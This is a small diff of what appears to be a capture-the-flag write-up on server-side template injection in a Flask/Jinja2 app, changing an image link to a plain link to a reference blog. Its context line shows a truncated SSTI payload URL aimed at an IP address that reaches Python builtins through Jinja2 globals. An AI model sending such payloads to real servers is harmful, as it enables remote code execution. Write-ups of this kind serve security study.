@@ -63,7 +63,7 @@ http://159.65.89.165:31913/%7B%7Brequest.application.__globals__.__builtins__.__
 
 
 ### REFERENCE
-![BLOG]( https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
+[BLOG]( https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
 ### NOTE
 ```javascript
 TECH-STACK: Python,Flask,jinja2
